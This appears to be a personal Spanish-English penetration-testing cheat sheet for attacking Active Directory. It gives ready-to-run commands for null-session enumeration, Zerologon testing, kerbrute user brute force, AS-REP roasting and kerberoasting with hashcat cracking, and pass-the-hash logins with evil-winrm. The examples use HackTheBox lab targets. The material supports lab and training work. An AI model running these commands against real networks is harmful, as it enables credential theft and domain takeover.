## WITHOUT USER

1.  Check [[RPC (135)]] null session:

```
    rpcclient <<IP>>
    rpcclient -U "" -N <<IP>>
```

2. Check [[SMB (139, 445)]] null session:

```
   
    crackmapexec smb {IP} --pass-pol -u "guest" -p ""
    
    smbmap -H {IP} -u null -p null
    smbmap -H {IP} -u guest
    
    smbclient -N -L //{IP}
    smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
    
```

**!!NOTA IMPORTANTE!!** 
* Con la opción `--shares` para listar los directorios compartidos.

* Si queremos que continue sin que se pare en el primer éxito: `--continue-on-success`

**!!NOTA IMPORTANTE!!**  Buscar vulnerabilidades asociadas a SMB sobre todo si son equipos antiguos (EternalBlue)

3. Check [[LDAP (389, 636)]] to obtain interesting information (null credential):

```
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
# or
./windapsearch.py -U --full --dc-ip <<IP>>

# or
crackmapexec ldap {IP} --pass-pol -u "" -p ""
```

4. Test [[ZEROLOGON]]

```
#En el virtual env que se encuentra en /home/kali/VENV/zerologon
source venv/bin/activate

python3 zerologon_tester.py MULTIMASTER 10.10.10.179 <DC NAME (Netbios)> <IP>
```

5.  [[BRUTE FORCE]] (Kerberos)

	* Herramienta: /home/kali/kerbrute/dist/kerbrute_linux_amd64

```
/home/kali/htb/intelligence/enumeration/kerbrute/dist/kerbrute_linux_amd64  userenum --dc <<IP DC>> -d <<DOMUNIO>> <<Lista de usuarios>> 

#Diccionario para enumerar usuarios -> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

**!!NOTA IMPORTANTE!!** Aunque **Kerbrute nos de un hash de los usuarios ASEREPROASTEABLES** probar con impacket-GetNPUser con el usuario por que nos puede dar otro distinto. En algun ejemplo no me ha funcionado el hash que da Kerbrute.

6. Test otros servicios comunes: ssh, http, ftp, etc --> [[NMAP ENUMERATION CHECKLIST]]

7. NTLM RELAY + RESPONDER

## WITH USER

1. [[BRUTE FORCE]] (Kerberos)

	* Herramienta: /home/kali/kerbrute/dist/kerbrute_linux_amd64

```
/home/kali/htb/intelligence/enumeration/kerbrute/dist/kerbrute_linux_amd64  userenum --dc <<IP DC>> -d <<DOMUNIO>> <<Lista de usuarios>> 

#Si no encuentras nada prueba a aplicar fuerza bruta con el parametro bruteforce (pruebas los usuarios también como contraseñas)
```

**!!NOTA IMPORTANTE!!** Aunque **Kerbrute nos de un hash de los usuarios ASEREPROASTEABLES** probar con impacket-GetNPUser con el usuario por que nos puede dar otro distinto. En algun ejemplo no me ha funcionado el hash que da Kerbrute.

2. [[ASREPROAST]] (se le pasan usuarios sin contraseñas)

```
impacket-GetNPUsers -dc-ip 10.10.10.192 -no-pass -usersfile usuarios-kerberos.txt blackfield.local/
```

Si tenemos un usuario y una pass tambien podemos usar tambien ASEREPROAST para obener el ticket de otros usuarios (SIGUIENTE APARTADO)

Mejor comando ASREP:

````
impacket-GetNPUsers active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -format john -outputfile hash
````

IMPORTANTE Para crackear la pass utilizar el siguiente comando:

```
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --forc
```

Smbclient --> smbclient -U BLACKFIELD.local/support //10.10.10.192/NETLOGON 

Otros kerberos
## WITH USER AND PASS

1. [[WINRM]]

```
#Con usuario y contraseña:
evil-winrm -i <<IP>> -u <<usuario>> -p <<contraseña>>
#Ejm PTT
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

2.  Check [[SMB (139, 445)]] y comprueba si es vulnerable a PSEXEC

2. Check [[SMB (139, 445)]] y compruebas los recursos compartidos del usuario y si es vulenrable a PSEXEC (crackmapexec).

```
# Puedes checkearlo con crackmapexec y conectarte al recurso susando smb
smbclient -U <<DOMINIO>>/<<USUARIO>> //<<ip>>/<<RECURSO COMPARTIDO>>
# Ejemplo:
smbclient -U BLACKFIELD.local/support //10.10.10.192/NETLOGON
```

4. Comprueba el RDP (3389) -> Crackmapexec suele fallar

Manualmente:

```
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:stephanie /v:192.168.201.75
```

6. [[PASSWORD SPRAY]]

7. [[KERBEROASTING]]

```
impacket-GetUserSPNs <<domain name>>/<<username>>:<<password>> -outputfile <<krbroast>>
```

**!!NOTA IMPORTANTE!!** SI NOS DA ESTE ERROR --> TENEMOS QUE SINCRONIZARNOS

![[Pasted image 20230525200042.png]]

```
 ntpdate <IP of DC>
```

6. SI TENEMOS ACCESO COMPROBAR HISTORIAL DE USUARIO O MIARLO EN WINPEAS

```
(Get-PSReadlineOption).HistorySavePath
```

![[Pasted image 20230611154748.png]]
 5. GOLDEN/SILVER TICKETS

8. Vuelve a comprobar todo lo anterior pero con usuario y contraseña: rpc, smb, etc.

![[Pasted image 20230218131515.png]]
